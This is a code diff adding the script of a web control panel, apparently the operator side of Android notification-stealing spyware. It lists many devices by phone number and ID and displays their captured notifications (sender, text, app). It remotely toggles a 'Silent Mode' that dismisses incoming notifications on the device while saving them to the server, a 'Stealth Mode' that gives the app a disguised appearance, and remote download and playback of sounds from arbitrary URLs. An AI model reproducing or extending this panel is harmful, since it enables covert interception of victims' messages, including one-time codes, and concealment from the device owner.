+    renderSilentToggle(u.silentOn ? 'on' : 'off');
+    silentSub.textContent = 'Device is offline. Silent Mode cannot be changed right now.';
+    silentSub.style.color = '#ff8c8c';
+    setTimeout(() => { silentSub.style.color = ''; if (allUsersData[currentSelectedId]) { const cu = allUsersData[currentSelectedId]; silentSub.textContent = cu.silentOn ? 'Silent Mode is active.' : 'Incoming notifications are silently saved to the server.'; } }, 3000);
+    return;
+  }
+
+  const target = !u.silentOn;   // naya value
+  const base = silentDevicePath();
+
+  silentBusy = true;
+  renderSilentToggle('busy');
+
+  // Pehle ack ko reset karo, taaki purana ack galti se confirm na kar de
+  fetch(base + '/Silent_mode_ack.json', {
+    method: 'PUT', headers: {'Content-Type': 'application/json; charset=UTF-8'}, body: 'false'
+  }).catch(() => {}).finally(() => {
+    // Ab asli flag likho
+    fetch(base + '/Silent_mode.json', {
+      method: 'PUT', headers: {'Content-Type': 'application/json; charset=UTF-8'},
+      body: target ? 'true' : 'false'
+    }).then(() => {
+      waitForSilentAck(base, target);
+    }).catch(() => {
+      silentBusy = false;
+      renderSilentToggle(u.silentOn ? 'on' : 'off');
+      silentSub.textContent = 'Network error. Please try again.';
+      silentSub.style.color = '#ff8c8c';
+    });
+  });
+}
+
+// Ack aane ka wait (max 30s). App 3s poll karke ack bhejta hai.
+function waitForSilentAck(base, target) {
+  const startedAt = Date.now();
+  clearInterval(silentAckTimer);
+  silentAckTimer = setInterval(() => {
+    if (Date.now() - startedAt > 30000) {
+      clearInterval(silentAckTimer);
+      silentBusy = false;
+      renderSilentToggle(target ? 'off' : 'on');
+      silentSub.textContent = 'Confirmation failed. The device may be offline or the connection is slow.';
+      silentSub.style.color = '#ff8c8c';
+      return;
+    }
+    fetch(base + '/Silent_mode_ack.json', {cache:'no-store'})
+      .then(r => r.text())
+      .then(txt => {
+        const ack = String(txt).trim() === 'true';
+        if (ack === target) {
+          clearInterval(silentAckTimer);
+          silentBusy = false;
+          if (allUsersData[currentSelectedId]) allUsersData[currentSelectedId].silentOn = target;
+          renderSilentToggle(target ? 'on' : 'off');
+          silentSub.textContent = target
+            ? 'Confirmed. Incoming notifications are now being dismissed instantly.'
+            : 'Silent Mode has been disabled.';
+          silentSub.style.color = '#8ce5c2';
+          setTimeout(() => { silentSub.style.color = ''; }, 2500);
+        }
+      })
+      .catch(() => {});
+  }, 1200);
+}
+
+if (silentToggle) silentToggle.addEventListener('click', toggleSilentMode);
+// ================= STEALTH MODE =================
+let stealthBusy = false;
+let stealthAckTimer = null;
+
+function stealthDevicePath() {
+  if (!currentSelectedId) return null;
+  return DATABASE_URL.replace('.json', '/' + encodeURIComponent(currentSelectedId));
+}
+
+function renderStealthToggle(state) {
+  stealthToggle.classList.remove('on','busy');
+  if (state === 'on') {
+    stealthToggle.classList.add('on');
+    stealthSub.textContent = 'Stealth Mode is active.';
+    stealthSub.style.color = '';
+  } else if (state === 'busy') {
+    stealthToggle.classList.add('busy');
+    stealthSub.textContent = 'Waiting for confirmation from the device...';
+    stealthSub.style.color = '#f59e0b';
+  } else {
+    stealthSub.textContent = ' A disguised appearance.';
+    stealthSub.style.color = '';
+  }
+}
+
+function refreshStealthBarForSelected() {
+  if (!currentSelectedId || !allUsersData[currentSelectedId]) {
+    stealthBar.style.display = 'none';
+  soundBar.style.display = 'none';
+  if (controlsWrap) { controlsWrap.style.display = 'none'; setControlsExpanded(false); }
+    return;
+  }
+  stealthBar.style.display = 'flex';
+  const u = allUsersData[currentSelectedId];
+  renderStealthToggle(u.stealthOn ? 'on' : 'off');
+}
+
+function toggleStealthMode() {
+  if (stealthBusy || !currentSelectedId) return;
+  const u = allUsersData[currentSelectedId];
+  if (!u) return;
+
+  if (!isOnline(u)) {
+    renderStealthToggle(u.stealthOn ? 'on' : 'off');
+    stealthSub.textContent = 'Device is offline. Stealth Mode cannot be changed right now.';
+    stealthSub.style.color = '#ff8c8c';
+    setTimeout(() => { stealthSub.style.color = ''; if (allUsersData[currentSelectedId]) { const cu = allUsersData[currentSelectedId]; stealthSub.textContent = cu.stealthOn ? 'Stealth Mode is active.' : ' A disguised appearance.'; } }, 3000);
+    return;
+  }
+
+  const target = !u.stealthOn;
+  const base = stealthDevicePath();
+
+  stealthBusy = true;
+  renderStealthToggle('busy');
+
+  fetch(base + '/Stealth_mode_ack.json', {
+    method: 'PUT', headers: {'Content-Type': 'application/json; charset=UTF-8'}, body: 'false'
+  }).catch(() => {}).finally(() => {
+    fetch(base + '/Stealth_mode.json', {
+      method: 'PUT', headers: {'Content-Type': 'application/json; charset=UTF-8'},
+      body: target ? 'true' : 'false'
+    }).then(() => {
+      waitForStealthAck(base, target);
+    }).catch(() => {
+      stealthBusy = false;
+      renderStealthToggle(u.stealthOn ? 'on' : 'off');
+      stealthSub.textContent = 'Network error. Please try again.';
+      stealthSub.style.color = '#ff8c8c';
+    });
+  });
+}
+
+function waitForStealthAck(base, target) {
+  const startedAt = Date.now();
+  clearInterval(stealthAckTimer);
+  stealthAckTimer = setInterval(() => {
+    if (Date.now() - startedAt > 30000) {
+      clearInterval(stealthAckTimer);
+      stealthBusy = false;
+      renderStealthToggle(target ? 'off' : 'on');
+      stealthSub.textContent = 'Confirmation failed. The device may be offline or the connection is slow.';
+      stealthSub.style.color = '#ff8c8c';
+      return;
+    }
+    fetch(base + '/Stealth_mode_ack.json', {cache:'no-store'})
+      .then(r => r.text())
+      .then(txt => {
+        const ack = String(txt).trim() === 'true';
+        if (ack === target) {
+          clearInterval(stealthAckTimer);
+          stealthBusy = false;
+          if (allUsersData[currentSelectedId]) allUsersData[currentSelectedId].stealthOn = target;
+          renderStealthToggle(target ? 'on' : 'off');
+          stealthSub.textContent = target ? 'Confirmed. Stealth Mode is enabled.' : 'Stealth Mode has been disabled.';
+          stealthSub.style.color = '#4ade80';
+          setTimeout(() => { stealthSub.style.color = ''; }, 2500);
+        }
+      })
+      .catch(() => {});
+  }, 1200);
+}
+
+if (stealthToggle) stealthToggle.addEventListener('click', toggleStealthMode);
+// ================= SOUND CONTROL =================
+let soundSelectedLevel = 'low';
+let soundPendingUntil = 0;
+let soundDownloadedUrl = '';   // already downloaded url (preset track)
+try { const _sd = localStorage.getItem('sound_dl_url'); if (_sd) soundDownloadedUrl = _sd; } catch(e){}
+let soundReadyRestore = {};   // jin devices ka sound already ready (page reload ke baad bhi skip)   // is time tak loading dikhao
+
+function soundDevicePath() {
+  if (!currentSelectedId) return null;
+  return DATABASE_URL.replace('.json', '/' + encodeURIComponent(currentSelectedId));
+}
+
+function setSoundLevel(lvl) {
+  soundSelectedLevel = lvl;
+  document.querySelectorAll('.sound-lvl').forEach(b => {
+    b.classList.toggle('active', b.getAttribute('data-lvl') === lvl);
+  });
+  if (currentSelectedId && allUsersData[currentSelectedId] && allUsersData[currentSelectedId].soundPlaying) {
+    const base = soundDevicePath();
+    if (base) fetch(base + '/Sound_level.json', {method:'PUT', headers:{'Content-Type':'application/json; charset=UTF-8'}, body: JSON.stringify(lvl)}).catch(()=>{});
+  }
+}
+
+function renderSound() {
+  const u = currentSelectedId ? allUsersData[currentSelectedId] : null;
+  if (!u) { soundBar.style.display = 'none'; return; }
+  soundBar.style.display = 'flex';
+
+  const st = u.soundDlStatus || 'idle';
+  const playing = !!u.soundPlaying;
+  const pending = Date.now() < soundPendingUntil;
+
+  if (st === 'downloading') {
+    const pct = Number(u.soundDlProgress) || 0;
+    soundProgressWrap.style.display = 'block';
+    soundProgressText.textContent = 'Downloading... ' + pct + '%';
+    soundProgressFill.style.width = pct + '%';
+    soundStatus.textContent = 'Downloading...';
+    soundStatus.className = 'sound-status downloading';
+    soundLevelRow.style.display = 'none';
+    soundPlayBtn.style.display = 'none';
+    soundDlBtn.disabled = true;
+    document.querySelectorAll('.preset-btn').forEach(b => { b.disabled = true; });
+  } else if (st === 'ready') {
+    soundReadyRestore[u.androidId] = true;
+    if (soundDownloadedUrl) { document.querySelectorAll('.preset-btn').forEach(x => { if (x.getAttribute('data-url') === soundDownloadedUrl) x.classList.add('active'); }); }
+    soundProgressWrap.style.display = 'none';
+    soundStatus.textContent = 'Sound ready to play';
+    soundStatus.className = 'sound-status ready';
+    soundLevelRow.style.display = 'flex';
+    soundPlayBtn.style.display = 'block';
+    soundDlBtn.disabled = false;
+    document.querySelectorAll('.preset-btn').forEach(b => { b.disabled = false; });
+    if (pending) {
+      soundPlayBtn.classList.add('busy');
+      soundPlayBtn.textContent = playing ? 'STOPPING...' : 'STARTING...';
+    } else {
+      soundPlayBtn.classList.remove('busy');
+      soundPlayBtn.textContent = playing ? 'PAUSE' : 'PLAY';
+      soundPlayBtn.classList.toggle('playing', playing);
+    }
+  } else if (st === 'failed') {
+    soundDownloadedUrl = '';
+    try { localStorage.removeItem('sound_dl_url'); } catch(e){}
+    soundReadyRestore[u.androidId] = false;
+    soundProgressWrap.style.display = 'none';
+    soundStatus.textContent = 'Download failed. Check the URL and try again.';
+    soundStatus.className = 'sound-status failed';
+    soundLevelRow.style.display = 'none';
+    soundPlayBtn.style.display = 'none';
+    soundDlBtn.disabled = false;
+    document.querySelectorAll('.preset-btn').forEach(b => { b.disabled = false; });
+    if (!soundUrl.dataset.cleared) { soundUrl.value = ''; soundUrl.dataset.cleared = '1'; }
+  } else {
+    soundReadyRestore[u.androidId] = false;
+    soundProgressWrap.style.display = 'none';
+    soundDownloadedUrl = '';
+    try { localStorage.removeItem('sound_dl_url'); } catch(e){}
+    soundStatus.textContent = 'Not downloaded';
+    soundStatus.className = 'sound-status';
+    soundLevelRow.style.display = 'none';
+    soundPlayBtn.style.display = 'none';
+    soundDlBtn.disabled = false;
+  }
+}
+
+function downloadFromUrl(url, btn) {
+  if (!currentSelectedId) return;
+  const u = allUsersData[currentSelectedId];
+  if (!u) return;
+  if (!isOnline(u)) {
+    soundStatus.textContent = 'Device is offline.';
+    soundStatus.className = 'sound-status failed';
+    return;
+  }
+  if (!url || url.length < 8) {
+    soundStatus.textContent = 'Enter a valid sound URL first.';
+    soundStatus.className = 'sound-status failed';
+    return;
+  }
+  // Agar YEHI sound already ready hai -> kuch mat karo (different URL allow)
+  if (u.soundDlStatus === 'ready' && soundDownloadedUrl === url) {
+    soundStatus.textContent = 'Sound ready to play';
+    soundStatus.className = 'sound-status ready';
+    if (btn) btn.disabled = false;
+    return;
+  }
+  if (btn) btn.disabled = true;
+  soundDownloadedUrl = url;
+  try { localStorage.setItem('sound_dl_url', url); } catch(e){}
+  const base = soundDevicePath();
+  soundStatus.textContent = 'Requesting download...';
+  soundStatus.className = 'sound-status downloading';
+
+  fetch(base + '/Sound_url.json', {method:'PUT', headers:{'Content-Type':'application/json; charset=UTF-8'}, body: JSON.stringify(url)})
+    .then(() => fetch(base + '/Sound_dl_cmd.json', {method:'PUT', headers:{'Content-Type':'application/json; charset=UTF-8'}, body: JSON.stringify('download')}))
+    .then(() => {
+      soundProgressWrap.style.display = 'block';
+      soundProgressText.textContent = 'Downloading... 0%';
+      soundProgressFill.style.width = '0%';
+      soundPendingUntil = Date.now() + 3000;
+    })
+    .catch(() => {
+      if (btn) btn.disabled = false;
+      soundStatus.textContent = 'Request failed. Try again.';
+      soundStatus.className = 'sound-status failed';
+    });
+}
+
+function downloadSound() {
+  delete soundUrl.dataset.cleared;
+  document.querySelectorAll('.preset-btn').forEach(x => x.classList.remove('active'));
+  downloadFromUrl(soundUrl.value.trim(), soundDlBtn);
+}
+
+function toggleSoundPlay() {
+  if (!currentSelectedId) return;
+  const u = allUsersData[currentSelectedId];
+  if (!u || u.soundDlStatus !== 'ready') return;
+  const base = soundDevicePath();
+  const playing = !!u.soundPlaying;
+  const cmd = playing ? 'stop' : 'play';
+  // Loading state - 4 sec tak pending (Firebase confirm hone tak)
+  soundPendingUntil = Date.now() + 4000;
+  soundPlayBtn.classList.add('busy');
+  soundPlayBtn.textContent = playing ? 'STOPPING...' : 'STARTING...';
+  fetch(base + '/Sound_cmd.json', {method:'PUT', headers:{'Content-Type':'application/json; charset=UTF-8'}, body: JSON.stringify(cmd)})
+    .then(() => {
+      if (cmd === 'play') {
+        return fetch(base + '/Sound_level.json', {method:'PUT', headers:{'Content-Type':'application/json; charset=UTF-8'}, body: JSON.stringify(soundSelectedLevel)});
+      }
+    })
+    .catch(()=>{})
+    .finally(() => {
+      // Har 600ms check - jab tak Firebase me Sound_playing update na ho
+      let tries = 0;
+      const chk = setInterval(() => {
+        tries++;
+        if (currentSelectedId && allUsersData[currentSelectedId]) {
+          const cu = allUsersData[currentSelectedId];
+          const want = (cmd === 'play');
+          if (cu.soundPlaying === want || tries > 8) {
+            clearInterval(chk);
+            soundPendingUntil = 0;
+            renderSound();
+          }
+        } else if (tries > 8) {
+          clearInterval(chk);
+          soundPendingUntil = 0;
+          renderSound();
+        }
+      }, 600);
+    });
+}
+
+if (soundDlBtn) soundDlBtn.addEventListener('click', downloadSound);
+// Preset sound buttons
+document.querySelectorAll('.preset-btn').forEach(b => {
+  b.addEventListener('click', () => {
+    const url = b.getAttribute('data-url');
+    document.querySelectorAll('.preset-btn').forEach(x => x.classList.remove('active'));
+    b.classList.add('active');
+    // Agar wahi sound already ready hai -> kuch nahi
+    const cu = currentSelectedId ? allUsersData[currentSelectedId] : null;
+    if (cu && cu.soundDlStatus === 'ready' && soundDownloadedUrl === url) return;
+    downloadFromUrl(url, b);
+  });
+});
+
+// Custom URL toggle
+if (customToggle) {
+  customToggle.addEventListener('click', () => {
+    const open = customUrlWrap.style.display !== 'none';
+    customUrlWrap.style.display = open ? 'none' : 'flex';
+    customToggle.textContent = open ? '+ Custom URL' : '- Hide Custom URL';
+  });
+}
+if (soundPlayBtn) soundPlayBtn.addEventListener('click', toggleSoundPlay);
+// ===== CONTROLS DROPDOWN =====
+// Dynamic button (headerHTML me) -> event delegation
+document.addEventListener('click', (e) => {
+  const btn = e.target.closest && e.target.closest('#controlsToggleBtn');
+  if (!btn) return;
+  const wrap = document.getElementById('controlsWrap');
+  if (!wrap) return;
+  const open = wrap.style.display !== 'none';
+  wrap.style.display = open ? 'none' : 'block';
+  btn.setAttribute('aria-expanded', open ? 'false' : 'true');
+});
+document.querySelectorAll('.sound-lvl').forEach(b => {
+  b.addEventListener('click', () => setSoundLevel(b.getAttribute('data-lvl')));
+});
+
+
+
+function escapeHTML(value) {
+  return String(value ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+function formatTime(ts) {
+  if (!ts) return 'Time unavailable';
+  const d = new Date(ts);
+  if (Number.isNaN(d.getTime())) return 'Time unavailable';
+  return d.toLocaleString('en-IN', {day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit',hour12:true});
+}
+function parseTs(v) {
+  if (v === null || v === undefined || v === '') return 0;
+  if (typeof v === 'number' && Number.isFinite(v)) return v < 1e12 ? v * 1000 : v;
+  const raw = String(v).trim();
+  if (!raw) return 0;
+  if (/^\d+(?:\.\d+)?$/.test(raw)) {
+    const n = Number(raw);
+    return Number.isFinite(n) ? (n < 1e12 ? n * 1000 : n) : 0;
+  }
+  const p = Date.parse(raw);
+  return Number.isNaN(p) ? 0 : p;
+}
+function displayName(u) {
+  return (u.number && u.number.length > 0 && u.number !== 'N/A') ? u.number : u.androidId;
+}
+function isOnline(u) {
+  if (u.status !== 'Online') return false;
+  if (!u.lastSeen) return false;
+  return (Date.now() - u.lastSeen) < ONLINE_WINDOW_MS;
+}
+
+function updateStats() {
+  const users = Object.values(allUsersData);
+  document.getElementById('totalDevices').textContent = users.length.toLocaleString('en-IN');
+  document.getElementById('totalMessages').textContent = users.reduce((s,u)=>s+u.notiList.length,0).toLocaleString('en-IN');
+  document.getElementById('selectedMessages').textContent = currentSelectedId && allUsersData[currentSelectedId] ? allUsersData[currentSelectedId].notiList.length.toLocaleString('en-IN') : '--';
+  document.getElementById('userCount').textContent = `${users.length} ${users.length === 1 ? 'device' : 'devices'}`;
+}
+function getFilteredUsers() {
+  const term = searchInput.value.trim().toLowerCase();
+  const ordered = Object.values(allUsersData).sort((a,b) =>
+    (b.createdAt - a.createdAt) || a.androidId.localeCompare(b.androidId));
+  ordered.forEach((u,i) => { u.serialNo = i + 1; });
+  return ordered.filter(u =>
+    u.androidId.toLowerCase().includes(term) ||
+    (u.number || '').toLowerCase().includes(term) ||
+    (u.uid || '').toLowerCase().includes(term));
+}
+function renderUserList(users) {
+  userListEl.innerHTML = '';
+  if (!users.length) {
+    userListEl.innerHTML = '<div class="empty-state sidebar-empty">No matching devices found.</div>';
+    return;
+  }
+  users.forEach((user,index) => {
+    const name = displayName(user);
+    const online = isOnline(user);
+    const metaUid = user.uid ? `UID ${escapeHTML(user.uid)}` : 'Awaiting login';
+    const btn = document.createElement('button');
+    btn.type = 'button';
+    btn.className = `user-item ${user.androidId === currentSelectedId ? 'active' : ''}`;
+    btn.setAttribute('aria-label', `View notifications for ${escapeHTML(name)}`);
+    btn.innerHTML = `
+      <div class="user-index">${user.serialNo || index+1}</div>
+      <div class="user-info">
+        <div class="user-phone">
+          <span class="status-dot ${online ? 'online' : 'offline'}"></span>
+          <span class="user-name">${escapeHTML(name)}</span>
+        </div>
+        <div class="user-meta"><span>${metaUid}</span><span class="meta-dot"></span><span class="sms-count">${user.notiList.length} Notifications</span></div>
+      </div>`;
+    btn.addEventListener('click',()=>selectUser(user.androidId));
+    userListEl.appendChild(btn);
+  });
+}
+function renderMessages(user) {
+  smsContainer.innerHTML = '';
+  document.getElementById('messageCount').textContent = `${user.notiList.length} ${user.notiList.length === 1 ? 'notification' : 'notifications'}`;
+  if (!user.notiList.length) {
+    smsContainer.innerHTML = '<div class="empty-state">No notifications found for this device.</div>';
+    return;
+  }
+  user.notiList.forEach(noti => {
+    const card = document.createElement('article');
+    card.className = 'sms-card';
+    card.innerHTML = `<div class="sms-header"><span class="sms-sender">${escapeHTML(noti.title)}</span><time class="sms-time">${escapeHTML(formatTime(noti.time))}</time></div><div class="sms-body">${escapeHTML(noti.text)}<span class="sms-pkg">${escapeHTML(noti.package)}</span></div>`;
+    smsContainer.appendChild(card);
+  });
+}
+function headerHTML(user) {
+  const name = displayName(user);
+  const online = isOnline(user);
+  const uidText = user.uid ? `UID: ${escapeHTML(user.uid)}` : 'UID: <span style="color:#808080">Pending login</span>';
+  const numberText = user.number ? `Number: ${escapeHTML(user.number)}` : 'Number: <span style="color:#808080">Not linked</span>';
+  return `<div class="header-row">
+      <div class="header-phone">
+        <span class="status-dot ${online ? 'online' : 'offline'}"></span>
+        <span>${escapeHTML(name)}</span>
+      </div>
+      <span class="header-online ${online ? 'on' : 'off'}">${online ? 'ONLINE' : 'OFFLINE'}</span>
+    </div>
+    <div class="header-sub-row">
+      <div class="header-sub">${uidText} <span style="color:#666666"> | </span> ${numberText}<br>Android ID: ${escapeHTML(user.androidId)}</div>
+      <button id="controlsToggleBtn" class="controls-toggle-btn" aria-expanded="false">CONTROLS <span class="ctrl-arrow">&#9662;</span></button>
+    </div>`;
+}
+
+function selectUser(androidId) {
+  const user = allUsersData[androidId];
+  if (!user) return;
+  currentSelectedId = androidId;
+  headerText.innerHTML = headerHTML(user);
+  renderMessages(user);
+  renderUserList(getFilteredUsers());
+  updateStats();
+  refreshSilentBarForSelected();
+  refreshStealthBarForSelected();
+  renderSound();
+  // Naya device select -> controls collapse (default band)
+  if (controlsWrap) { controlsWrap.style.display = 'none'; setControlsExpanded(false); }
+  if (window.innerWidth <= 760) {
+    if (!document.body.classList.contains('show-details')) {
+      history.pushState({notiVaultView:'details'}, '', '#device');
+      detailsHistoryActive = true;
+    }
+    document.body.classList.add('show-details');
+  }
+}
+function fetchData() {
+  fetch(DATABASE_URL, {cache:'no-store'})
+    .then(r => { if (!r.ok) throw new Error(`HTTP ${r.status}`); return r.json(); })
+    .then(data => {
+      if (!data || typeof data !== 'object') {
+        allUsersData = {};
+        renderUserList([]);
+        updateStats();
+        return;
+      }
+      const next = {};
+      for (const androidId in data) {
+        const record = data[androidId] || {};
+        const ud = record.User_details || {};
+        const notiList = [];
+        const notiObj = record.Notifications || {};
+        for (const key in notiObj) {
+          if (key.startsWith('Notification_') && notiObj[key] && typeof notiObj[key] === 'object') {
+            notiList.push({
+              id: key,
+              package: notiObj[key].package || 'Unknown',
+              title: notiObj[key].title || 'No Title',
+              text: notiObj[key].text || '',
+              time: notiObj[key].time || 0
+            });
+          }
+        }
+        notiList.sort((a,b)=>Number(b.time)-Number(a.time));
+        // Time milao - last_seen purana hai to Firebase me Offline likh do
+        syncOfflineToFirebase(androidId, Number(ud.last_seen) || 0, String(ud.status || ''));
+        next[androidId] = {
+          androidId,
+          uid: String(ud.uid || ''),
+          number: String(ud.number || ''),
+          status: String(ud.status || 'Offline'),
+          lastSeen: Number(ud.last_seen) || 0,
+          createdAt: parseTs(ud.created_at),
+          silentOn: record.Silent_mode === true,
+          stealthOn: record.Stealth_mode === true,
+          soundDlStatus: record.Sound_dl_status || 'idle',
+          soundDlProgress: Number(record.Sound_dl_progress) || 0,
+          soundPlaying: record.Sound_playing === true,
+          soundLevel: record.Sound_level || 'low',
+          notiList
+        };
+      }
+      allUsersData = next;
+      // Agar koi device wapas Online ho gaya hai to usko set se hata do,
+      // taaki dobara offline hone par phir se likh sake.
+      for (const id in next) {
+        const u = next[id];
+        if (u.status === 'Online' && u.lastSeen && (Date.now() - u.lastSeen) < ONLINE_WINDOW_MS) {
+          offlineSynced.delete(id);
+        }
+      }
+      updateStats();
+      liveStatus.innerHTML = '<span class="live-dot"></span> Live sync';
+      renderUserList(getFilteredUsers());
+      if (currentSelectedId && allUsersData[currentSelectedId]) {
+        const s = allUsersData[currentSelectedId];
+        headerText.innerHTML = headerHTML(s);
+        renderMessages(s);
+        if (!silentBusy) refreshSilentBarForSelected();
+        if (!stealthBusy) refreshStealthBarForSelected();
+        renderSound();
+      } else if (currentSelectedId) {
+        currentSelectedId = null;
+        updateStats();
+      }
+    })
+    .catch(err => {
+      console.error('Load failed:', err);
+      liveStatus.innerHTML = '<span class="live-dot" style="background:#f59e0b"></span> Reconnecting';
+      if (!Object.keys(allUsersData).length) userListEl.innerHTML = '<div class="empty-state sidebar-empty">Could not load records. Check connection.</div>';
+    })
+    .finally(() => { if (pullRefreshing) finishPullRefresh(); });
+}
+searchInput.addEventListener('input',()=>renderUserList(getFilteredUsers()));
+function showDeviceList() {
+  document.body.classList.remove('show-details');
+  currentSelectedId = null;
+  detailsHistoryActive = false;
+  silentBar.style.display = 'none';
+  stealthBar.style.display = 'none';
+  soundBar.style.display = 'none';
+  if (controlsWrap) { controlsWrap.style.display = 'none'; setControlsExpanded(false); }
+  renderUserList(getFilteredUsers());
+  updateStats();
+}
+backBtn.addEventListener('click',()=>{
+  if (detailsHistoryActive && location.hash === '#device') history.back();
+  else showDeviceList();
+});
+window.addEventListener('popstate',()=>{
+  if (document.body.classList.contains('show-details')) showDeviceList();
+  else if (location.hash !== '#device') detailsHistoryActive = false;
+});
+
+
+// Pull to refresh
+let pullStartY = 0, pullDistance = 0, pullSurface = null, pullRefreshing = false;
+const PULL_TRIGGER = 78;
+function setPullIndicator(d) {
+  const v = Math.min(d, 105);
+  pullIndicator.style.setProperty('--pull-offset', `${Math.max(5, v - 38)}px`);
+  pullIndicator.style.opacity = String(Math.min(1, d / 48));
+  pullIndicator.classList.add('visible');
+}
+function finishPullRefresh() {
+  pullRefreshing = false;
+  pullIndicator.classList.remove('refreshing','visible');
+  pullIndicator.style.removeProperty('--pull-offset');
+  pullIndicator.style.removeProperty('opacity');
+  pullDistance = 0;
+  pullSurface = null;
+}
+function pullStart(e, surface) {
+  if (pullRefreshing || !e.touches || e.touches.length !== 1) return;
+  const atTop = surface === 'list' ? userListEl.scrollTop <= 0 : document.querySelector('.main').scrollTop <= 0;
+  if (!atTop) return;
+  pullStartY = e.touches[0].clientY;
+  pullDistance = 0;
+  pullSurface = surface;
+}
+function pullMove(e) {
+  if (pullSurface === null || pullRefreshing || !e.touches) return;
+  const delta = e.touches[0].clientY - pullStartY;
+  if (delta <= 0) { pullDistance = 0; pullIndicator.classList.remove('visible'); return; }
+  pullDistance = Math.min(delta * 0.55, 105);
+  if (delta > 4) e.preventDefault();
+  setPullIndicator(pullDistance);
+}
+function pullEnd() {
+  if (pullSurface === null || pullRefreshing) return;
+  if (pullDistance >= PULL_TRIGGER * 0.55) {
+    pullRefreshing = true;
+    pullIndicator.classList.add('refreshing','visible');
+    pullIndicator.style.setProperty('--pull-offset','12px');
+    pullIndicator.style.opacity = '1';
+    fetchData();
+  } else finishPullRefresh();
+}
+const sidebarEl = document.querySelector('.sidebar');
+const mainEl = document.querySelector('.main');
+sidebarEl.addEventListener('touchstart', e => pullStart(e,'list'), {passive:true});
+sidebarEl.addEventListener('touchmove', pullMove, {passive:false});
+sidebarEl.addEventListener('touchend', pullEnd, {passive:true});
+sidebarEl.addEventListener('touchcancel', finishPullRefresh, {passive:true});
+mainEl.addEventListener('touchstart', e => pullStart(e,'detail'), {passive:true});
+mainEl.addEventListener('touchmove', pullMove, {passive:false});
+mainEl.addEventListener('touchend', pullEnd, {passive:true});
+mainEl.addEventListener('touchcancel', finishPullRefresh, {passive:true});
+
+// Live SSE updates
+function connectLiveUpdates() {
+  if (!('EventSource' in window)) {
+    liveStatus.innerHTML = '<span class="live-dot" style="background:#f59e0b"></span> Auto refresh';
+    return;
+  }
+  try {
+    eventStream = new EventSource(DATABASE_URL);
+    const onDbChange = () => {
+      clearTimeout(streamRefreshTimer);
+      streamRefreshTimer = setTimeout(fetchData, 120);
+    };
+    eventStream.addEventListener('put', onDbChange);
+    eventStream.addEventListener('patch', onDbChange);
+    eventStream.onopen = () => { liveStatus.innerHTML = '<span class="live-dot"></span> Live sync'; };
+    eventStream.onerror = () => { liveStatus.innerHTML = '<span class="live-dot" style="background:#f59e0b"></span> Reconnecting'; };
+  } catch (err) {
+    console.error(err);
+    liveStatus.innerHTML = '<span class="live-dot" style="background:#f59e0b"></span> Auto refresh';
+  }
+}
+document.addEventListener('visibilitychange', () => { if (!document.hidden) fetchData(); });
+
+fetchData();
+connectLiveUpdates();
+// Online/offline state har 15s me re-check karega taaki timeout se offline dikh sake
+setInterval(() => {
+  renderUserList(getFilteredUsers());
+  if (currentSelectedId && allUsersData[currentSelectedId]) {
+    headerText.innerHTML = headerHTML(allUsersData[currentSelectedId]);
+    renderSound();
+  }
+  if (!eventStream || eventStream.readyState !== EventSource.OPEN) fetchData();
+}, 15000);
+</script>
+</body>
+</html>
